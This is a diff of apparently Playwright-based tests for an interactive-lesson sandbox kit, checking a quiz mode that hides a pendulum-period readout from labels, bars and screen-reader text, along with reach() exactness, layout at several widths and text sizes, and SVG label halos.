+    "K.readout({ id: 'f', label: 'Swings a minute', decimals: 0, into: '#outs' });\n" +
+    "const plot = window.__plot = K.plot('#plot', { x: { min: 0, max: 3, label: 'Length (m)' }, y: { min: 0, max: 4, label: 'Period (s)' } });\n" +
+    "const bars = K.bars('#bars', { unit: 's', decimals: 2 });\n" +
+    'K.model((p) => ({ T: period(p.L), f: 60 / period(p.L) }));\n' +
+    'K.update((p, o) => {\n' +
+    "  plot.draw({ series: [{ fn: period }], lines: [{ y: o.T, label: 'now ' + K.fmt(o.T, { decimals: 2 }) + ' s' }], marks: [{ x: p.L, y: o.T, label: K.fmt(o.T, { decimals: 2 }) + ' s', guides: true }, { x: 0.994, y: 2, label: 'Seconds pendulum' }] });\n" +
+    "  bars.draw([{ label: 'This string', value: o.T }, { label: 'A seconds pendulum', value: 2 }]);\n" +
+    "  if (!window.__first) window.__first = document.querySelector('[data-id=\"T\"] .k-readout-value').textContent;\n" +
+    "  document.getElementById('say').textContent = 'Each swing takes ' + K.fmt(o.T, { decimals: 2 }) + ' s.';\n" +
+    '});\n' +
+    "K.check('No length, no swing', () => K.near(period(0), 0));\n" +
+    "K.check('A 0.994 m string swings in 2 s', () => K.near(period(0.994), 2, 0.002));\n" +
+    "K.check('Four times the length doubles it', () => K.near(K.at({ L: 2 }).T / K.at({ L: 0.5 }).T, 2, 1e-9));\n" +
+    'K.ready();\n</script>';
+  const r0 = await app.page.evaluate((h) => U.sandbox.test(h, { widths: [340] }), quizBody);
+  expect('the quiz test body passes its self-test (test frames never have a quiz)', r0.ok, r0);
+  await app.page.evaluate(async (html) => {
+    const q = window.__q = { changes: [], errors: [] };
+    q.a = document.body.appendChild(document.createElement('div'));
+    q.b = document.body.appendChild(document.createElement('div'));
+    q.m = U.sandbox.mount(q.a, { html, quiz: { hide: 'T' }, onChange: (s) => q.changes.push(s), onError: (e) => q.errors.push(e) });
+    await q.m.ready;
+  }, quizBody);
+  const frameOf = async () => (await (await app.page.evaluateHandle(() => __q.m.frame)).asElement().contentFrame());
+  const look = async () => (await frameOf()).evaluate(() => {
+    const val = (id) => document.querySelector('[data-id="' + id + '"] .k-readout-value');
+    const say = document.getElementById('say'), bs = [...document.querySelectorAll('.k-bar b')];
+    return {
+      T: val('T').textContent, role: val('T').getAttribute('role'), aria: val('T').getAttribute('aria-label'), f: val('f').textContent,
+      say: getComputedStyle(say).visibility, sayH: say.getBoundingClientRect().height, sayText: say.textContent,
+      labels: window.__plot.labels.map((l) => l.text), alt: window.__plot.canvas.getAttribute('aria-label'),
+      bars: bs.map((b) => b.textContent), barAria: bs.map((b) => b.getAttribute('aria-label')), first: window.__first,
+    };
+  });
+  let st = await look();
+  expect('quiz: the hidden readout shows "?" from the first paint, labelled for screen readers; the other readout shows',
+    st.T === '?' && st.first === '?' && st.role === 'img' && st.aria === 'Hidden until you check your answer' && st.f === '30', st);
+  expect('quiz: the .say line is hidden, its space kept', st.say === 'hidden' && st.sayH > 10 && /2\.01/.test(st.sayText), st);
+  expect('quiz: plot labels and the plot\'s text alternative leave out the value; other labels stay',
+    !st.labels.some((t) => /2\.01/.test(t)) && st.labels.includes('Seconds pendulum') && !/2\.01/.test(st.alt) && /Seconds pendulum/.test(st.alt), st);
+  expect('quiz: the bar for that output shows "?", another bar its value', st.bars[0] === '?' && st.barAria[0] === 'Hidden until you check your answer' && st.bars[1] === '2.00 s', st);
+  const real = await app.page.evaluate(async () => { const s = await __q.m.set('L', 2); await new Promise((r) => setTimeout(r, 400)); return { T: s.outputs.T, change: __q.changes.length }; });
+  st = await look();
+  expect('quiz: get/set and change messages still carry the real outputs', near(real.T, 2.837, 0.001) && st.T === '?' && !st.labels.some((t) => /2\.84/.test(t)) && st.bars[0] === '?', { real, st });
+  // A self-test on the mounted frame runs with the quiz off and puts it back.
+  const rep = await app.page.evaluate(() => __q.m.selftest());
+  st = await look();
+  expect('quiz: the self-test never runs in quiz mode (it passes), and the quiz is back after it', rep.ok && st.T === '?' && st.say === 'hidden', { ok: rep.ok, errors: rep.errors, sweep: rep.sweep, st });
+  await app.page.evaluate(() => __q.m.reveal());
+  await app.page.waitForTimeout(300);
+  st = await look();
+  expect('reveal(): everything shows again', st.T === '2.84 s' && st.role === null && st.say === 'visible' && st.labels.includes('2.84 s') && st.labels.includes('now 2.84 s') && st.bars[0] === '2.84 s' && /2\.84/.test(st.alt), st);
+  // Moved in the page, the frame loads the kit again: after a reveal it stays revealed; with a quiz on, it is hidden again.
+  await app.page.evaluate(async () => { __q.b.appendChild(__q.m.el); await new Promise((r) => setTimeout(r, 1500)); });
+  st = await look();
+  expect('a frame moved after reveal() loads again with nothing hidden', st.T === '2.01 s' && st.say === 'visible', st);
+  await app.page.evaluate(async () => { __q.m.quiz('T'); await new Promise((r) => setTimeout(r, 300)); __q.a.appendChild(__q.m.el); await new Promise((r) => setTimeout(r, 1500)); });
+  st = await look();
+  expect('quiz(id) hides it again, and a reload keeps it hidden (the host sends the quiz after every ready)', st.T === '?' && st.say === 'hidden' && st.bars[0] === '?', st);
+  await app.page.evaluate(async () => { __q.m.quiz(null); await new Promise((r) => setTimeout(r, 300)); });
+  st = await look();
+  expect('quiz(null) ends it too', st.T === '2.01 s' && st.say === 'visible', st);
+  const qerr = await app.page.evaluate(() => { const e = __q.errors.slice(); __q.m.destroy(); return e; });
+  expect('no frame errors in quiz mode', !qerr.length, qerr);
+  // Which labels give the value away: a number that reads as it at its own rounding, or the word itself.
+  const marks = (labels) => JSON.stringify(labels.map((label, i) => ({ x: i + 1, y: 2, label })));
+  const altOf = async (model, hide, labels) => {
+    const html = '<div id="p"></div><script>\n' + model + "\nconst plot = K.plot('#p', { x: { min: 0, max: 8 }, y: { min: 0, max: 4 } });\n" +
+      'K.update(() => plot.draw({ marks: ' + marks(labels) + ' }));\n' + "K.check('a', () => true); K.ready();\n</script>";
+    const out = await app.page.evaluate(async ([h, id]) => {
+      const m = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html: h, quiz: { hide: id } });
+      await m.ready;
+      await new Promise((r) => setTimeout(r, 200));
+      window.__alt = m;
+      return null;
+    }, [html, hide]);
+    void out;
+    const fr = await (await app.page.evaluateHandle(() => __alt.frame)).asElement().contentFrame();
+    const alt = await fr.evaluate(() => document.querySelector('canvas').getAttribute('aria-label'));
+    await app.page.evaluate(() => __alt.destroy());
+    return alt;
+  };
+  const alt1 = await altOf('K.model(() => ({ share: 0.452, n: 1234567 }));', 'share', ['45.2%', '45%', '0.452', 'about 0.5', '46%', 'Seconds']);
+  expect('quiz: a label reading as the value at its own rounding is left out (45.2%, 45%, 0.452, about 0.5); 46% and words stay',
+    !/45\.2%|45%|0\.452|about 0\.5/.test(alt1) && /46%/.test(alt1) && /Seconds/.test(alt1), alt1);
+  const alt2 = await altOf("K.model(() => ({ n: 1234567 }));", 'n', ['1.23 million', '1,234,567', '1.2 × 10⁶', '1.25 million', 'Town']);
+  expect('quiz: large values in words, digit groups and powers of ten are caught too', !/1\.23 million|1,234,567|1\.2 × 10⁶/.test(alt2) && /1\.25 million/.test(alt2) && /Town/.test(alt2), alt2);
+  const alt3 = await altOf("K.model(() => ({ dir: 'north' }));", 'dir', ['Heading north', 'Northern route', 'South']);
+  expect('quiz: a word output is hidden only as a whole word', !/Heading north/.test(alt3) && /Northern route/.test(alt3) && /South/.test(alt3), alt3);
+
+  // reach().exact: does some step of the control show the target exactly?
+  const dp0 = body("K.model((p) => ({ y: p.a * 2 }));").replace("K.readout({ id: 'y', label: 'Y', into: '#o' });", "K.readout({ id: 'y', label: 'Y', decimals: 0, into: '#o' });");
+  const ex = await app.page.evaluate(async ([b, b0]) => ({
+    shown: await U.sandbox.reach(b, { control: 'a', output: 'y', target: 1.4, tolerance: 0.05, decimals: 1 }),
+    between: await U.sandbox.reach(b, { control: 'a', output: 'y', target: 1.5, tolerance: 0.1, decimals: 1 }),
+    coarse: await U.sandbox.reach(b, { control: 'a', output: 'y', target: 1.5, tolerance: 0.1, decimals: 0 }),
+    asShown: await U.sandbox.reach(b, { control: 'a', output: 'y', target: 1.5, tolerance: 0.1 }),
+    readout: await U.sandbox.reach(b0, { control: 'a', output: 'y', target: 1.5, tolerance: 0.1 }),
+  }), [body(plain), dp0]);
+  expect('reach().exact: a step shows the target exactly at the decimals given', ex.shown.reachable && ex.shown.exact === true, ex.shown);
+  expect('reach().exact: reachable within tolerance, but no step shows it exactly', ex.between.reachable && ex.between.exact === false, ex.between);
+  expect('reach().exact: at 0 decimals, 1.6 shows as the target 1.5 does ("2")', ex.coarse.exact === true, ex.coarse);
+  expect('reach().exact: without decimals, as the page\'s readout rounds it', ex.asShown.exact === false && ex.readout.exact === true, { asShown: ex.asShown, readout: ex.readout });
+  expect('no page errors in the quiz tests', !app.errors.length, app.errors);
+  await app.close();
+}
+
 // ---------- the exemplars and the KIT.md example pass, with zero page errors ----------
 section('exemplars and the host API');
 {
@@ -632,9 +1055,13 @@ section('exemplars and the host API');
     expect(ex.name + ' passes at 340, 720 and 1040 (' + (Date.now() - t0) + ' ms)', r.ok && r.widths.every((w) => w.ok) && !r.overflow && r.sweep.ok && !r.errors.length, r);
     expect(ex.name + ': 3+ checks, all pass, one cites a source', r.checks.length >= 3 && r.checks.every((c) => c.ok) && r.checks.some((c) => /^https:\/\//.test(c.source || '')), r.checks);
     expect(ex.name + ': no warnings', !(r.warnings || []).length, r.warnings);
-    // In the lesson's frame on a 360 / 390 px phone at Text size XL: no word splits ("German/y").
-    const xl = await app.page.evaluate((h) => U.sandbox.test(h, { widths: [338, 368], theme: Object.assign(U.sandbox.theme(), { size: 20 }) }), ex.body);
-    expect(ex.name + ' at Text size XL in a 338 and 368 px frame: every word whole, nothing cut off', xl.ok && !xl.clipped.length, xl.clipped.concat(xl.errors));
+    // In the lesson's frames (a 360 / 390 px phone, a column, the laptop's two widths) at Text
+    // sizes M and XL: it passes, and no word splits ("German/y").
+    for (const size of [16, 20]) {
+      const all = await app.page.evaluate(([h, sz]) => U.sandbox.test(h, { widths: [338, 368, 720, 926, 1086], theme: Object.assign(U.sandbox.theme(), { size: sz }) }), [ex.body, size]);
+      expect(ex.name + ' at Text size ' + (size === 20 ? 'XL' : 'M') + ' in 338, 368, 720, 926 and 1086 px frames: passes, every word whole, nothing cut off',
+        all.ok && !all.clipped.length && !(all.warnings || []).length, all.clipped.concat(all.errors, all.sweep.problems, all.warnings || []));
+    }
   }
 
   // mount: ready, get/set, sandbox, spoofed messages, keyboard, onChange, theme, errors, destroy
@@ -729,7 +1156,10 @@ section('exemplars and the host API');
     const box = document.createElement('div');
     box.style.width = '600px';
     document.body.appendChild(box);
-    window.__halo = U.sandbox.mount(box, { html: '<svg viewBox="0 0 340 80" width="100%" role="img" aria-label="x"><line x1="0" y1="20" x2="340" y2="20" stroke="black"/><text id="dark" x="10" y="24" fill="var(--k-ink)">on the page</text><rect x="150" y="40" width="150" height="30" fill="var(--k-accent2)"/><text id="light" x="160" y="60" fill="var(--k-on-accent2)">on navy</text><text id="nofill" x="10" y="70">no fill</text><g fill="var(--k-warn)"><text id="ingroup" x="10" y="78">group fill</text></g></svg><script>K.model(() => ({})); K.check("a", () => true); K.ready();</script>' });
+    window.__halo = U.sandbox.mount(box, { html: '<svg viewBox="0 0 340 80" width="100%" role="img" aria-label="x"><line x1="0" y1="20" x2="340" y2="20" stroke="black"/><text id="dark" x="10" y="24" fill="var(--k-ink)">on the page</text><rect x="150" y="40" width="150" height="30" fill="var(--k-accent2)"/><text id="light" x="160" y="60" fill="var(--k-on-accent2)">on navy</text><text id="nofill" x="10" y="70">no fill</text><g fill="var(--k-warn)"><text id="ingroup" x="10" y="78">group fill</text></g>' +
+      '<text id="outline" x="10" y="50" font-size="16" fill="none" stroke="#17324D" stroke-width="1.5">outlined</text><text id="own" x="220" y="24" fill="var(--k-ink)" stroke="#C0392B" stroke-width="0.5">own stroke</text></svg>' +
+      '<svg viewBox="0 0 100 60" width="100%" role="img" aria-label="y"><line x1="0" y1="30" x2="100" y2="30" stroke="var(--k-accent2)" stroke-width="0.8"/><text id="small" x="52" y="28" font-size="5">peak</text></svg>' +
+      '<script>K.model(() => ({})); K.check("a", () => true); K.ready();</script>' });
     await window.__halo.ready;
   });
   await app.page.waitForTimeout(200);
@@ -738,6 +1168,13 @@ section('exemplars and the host API');
     nofill: getComputedStyle(document.getElementById('nofill')).fill, ink: getComputedStyle(document.body).color, group: getComputedStyle(document.getElementById('ingroup')).fill, warn: K.theme.c.warn }));
   expect('a dark label crossing a line gets a page-coloured halo; white text on navy does not', halo.dark && !halo.light && /stroke/.test(halo.paint), halo);
   expect('text with no fill of its own takes the theme ink (not black), and a group fill still wins', halo.nofill === halo.ink && halo.group !== halo.ink, halo);
+  const own = await hf.evaluate(() => {
+    const look = (id) => { const t = document.getElementById(id), cs = getComputedStyle(t); return { halo: t.classList.contains('k-halo'), stroke: cs.stroke, width: parseFloat(cs.strokeWidth), size: parseFloat(cs.fontSize) }; };
+    return { outline: look('outline'), own: look('own'), small: look('small') };
+  });
+  expect('outlined text and text with its own stroke keep that stroke: no halo over it (audit 3, #44)',
+    !own.outline.halo && own.outline.stroke === 'rgb(23, 50, 77)' && !own.own.halo && own.own.stroke === 'rgb(192, 57, 43)', own);
+  expect('the halo is sized to the text, so a 5-unit label in a 100-unit drawing gets a thin one', own.small.halo && Math.abs(own.small.width / own.small.size - 0.25) < 0.02, own.small);
   await app.page.evaluate(() => { __halo.destroy(); });
   await app.page.setViewportSize({ width: 360, height: 800 });
 
